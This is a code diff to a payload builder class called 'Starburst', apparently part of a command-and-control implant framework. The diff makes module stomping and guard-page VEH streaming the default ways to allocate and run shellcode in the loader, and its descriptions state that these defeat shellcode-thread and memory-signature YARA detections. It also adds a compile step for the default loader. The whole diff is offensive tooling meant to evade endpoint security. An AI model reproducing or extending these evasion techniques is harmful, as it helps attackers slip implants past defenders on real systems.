@@ -132,7 +132,7 @@ class Starburst(PayloadType):
             parameter_type=BuildParameterType.ChooseOne,
             choices=["default", "udrl", "custom"],
             default_value="default",
-            description="Loader type: default (simple VirtualAlloc), udrl (reflective DLL loader), or custom (upload ZIP)",
+            description="Loader type: default (uses alloc/exec settings below), udrl (reflective DLL loader), or custom (upload ZIP)",
             hide_conditions=[
                 HideCondition(name="output_type", operand=HideConditionOperand.EQ, value="bin"),
             ],
@@ -188,9 +188,9 @@ class Starburst(PayloadType):
             name="alloc_method",
             group_name="Injection",
             parameter_type=BuildParameterType.ChooseOne,
-            choices=["VirtualAlloc", "NtAllocateVirtualMemory", "MapViewOfSection"],
-            default_value="VirtualAlloc",
-            description="Memory allocation method for loader (non-bin output only)",
+            choices=["ModuleStomp", "VirtualAlloc", "NtAllocateVirtualMemory", "MapViewOfSection"],
+            default_value="ModuleStomp",
+            description="Memory allocation: ModuleStomp (file-backed, defeats shellcode_thread), VirtualAlloc, NtAllocate, or MapView",
             hide_conditions=[
                 HideCondition(name="output_type", operand=HideConditionOperand.EQ, value="bin"),
                 HideCondition(name="output_type", operand=HideConditionOperand.EQ, value="shellcode"),
@@ -201,9 +201,9 @@ class Starburst(PayloadType):
             name="exec_method",
             group_name="Injection",
             parameter_type=BuildParameterType.ChooseOne,
-            choices=["direct", "CreateThread", "callback", "fiber", "threadpool"],
-            default_value="direct",
-            description="Local execution method for loader",
+            choices=["guardpage", "direct", "CreateThread", "callback", "fiber", "threadpool"],
+            default_value="guardpage",
+            description="Local execution: guardpage (VEH streaming, defeats memory_signature YARA), direct, CreateThread, callback, fiber, or threadpool",
             hide_conditions=[
                 HideCondition(name="output_type", operand=HideConditionOperand.EQ, value="bin"),
                 HideCondition(name="output_type", operand=HideConditionOperand.EQ, value="shellcode"),
@@ -812,7 +812,9 @@ class Starburst(PayloadType):
         defines = []
 
         alloc = self.get_parameter("alloc_method")
-        if alloc == "NtAllocateVirtualMemory":
+        if alloc == "ModuleStomp":
+            defines.append("#define ALLOC_MODULESTOMP")
+        elif alloc == "NtAllocateVirtualMemory":
             defines.append("#define ALLOC_NTALLOCATE")
         elif alloc == "MapViewOfSection":
             defines.append("#define ALLOC_MAPVIEW")
@@ -828,7 +830,9 @@ class Starburst(PayloadType):
             defines.append("#define INJECT_EARLYBIRD")
         else:
             exec_method = self.get_parameter("exec_method")
-            if exec_method == "CreateThread":
+            if exec_method == "guardpage":
+                defines.append("#define EXEC_GUARDPAGE")
+            elif exec_method == "CreateThread":
                 defines.append("#define EXEC_CREATETHREAD")
             elif exec_method == "callback":
                 defines.append("#define EXEC_CALLBACK")
@@ -971,6 +975,18 @@ class Starburst(PayloadType):
             logger.info("Built-in UDRL reflective loader compiled successfully")
         else:
             loader_path = os.path.join(cp_path, "default")
+            make_proc = await asyncio.create_subprocess_exec(
+                "make", "clean", arch,
+                cwd=loader_path, env=_make_env(),
+                stdout=asyncio.subprocess.PIPE,
+                stderr=asyncio.subprocess.PIPE,
+            )
+            make_stdout, make_stderr = await asyncio.wait_for(
+                make_proc.communicate(), timeout=60)
+            if make_proc.returncode != 0:
+                logger.error(f"Default loader compile failed: {make_stderr.decode(errors='replace')}")
+                return None
+            logger.info("Default Crystal Palace loader compiled successfully")
 
         out_file = os.path.join(build_path, f"out.{arch}.bin")
 
